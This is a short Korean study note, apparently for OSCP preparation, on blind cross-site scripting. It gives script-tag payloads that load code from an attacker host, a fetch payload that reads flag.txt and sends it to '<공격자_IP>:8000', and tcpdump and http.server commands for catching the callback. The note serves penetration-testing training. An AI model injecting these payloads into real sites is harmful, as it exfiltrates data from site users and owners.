# javascript blind xss

## 개요

블라인드 XSS(Blind XSS)는 결과를 바로 보지 못하고, 공격자 서버로 요청이 도달하는지로 판단하는 공격이다.
OSCP 웹 공격 단계에서 자주 나오는 유형이다.

## 개요

| 단계 | 설명 |
|------|------|
| 1 | 페이지에 악성 스크립트가 로드되는지 tcpdump/Wireshark로 관찰 |
| 2 | 요청이 공격자 서버로 도달했는지 확인 |
| 3 | 서버 로그로 도달 경로를 특정 |

## 사용법

```html
<script src=\"http://attacker_ip:port/\"></script>
```

- `<script src>`로 로드될 스크립트를 공격자 서버에 둔다.
- 서버 로그에서 `GET /<script>` 요청을 확인한다.

```html
<script>
  fetch('http://127.0.0.1:8000/flag.txt')
    .then(r => r.text())
    .then(data => {
      fetch('http://<공격자_IP>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

- `fetch`로 결과를 공격자 서버로 전송한다.
- 공격자는 자신의 서버에서 `http.server`로 서빙해 요청을 받아 플래그를 획득한다.

## 운영

```bash
# 공격자 서버 (attcker PC)
sudo tcpdump -i tun0 port 8000     # 트래픽 관찰 (Wireshark 사용)
python3 -m http.server 8000      # 스크립트 서빙
```

## 확인 사항

- 요청이 도달했는지가 공격 성공의 기준이다(화면에 결과가 안 보여도 성공).
- 도달 경로를 통해 어떤 파라미터가 악용되었는지 추적한다.
- 이 공격으로 얻은 데이터(플래그 등)는 증적(단계 6)에 포함한다.
- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
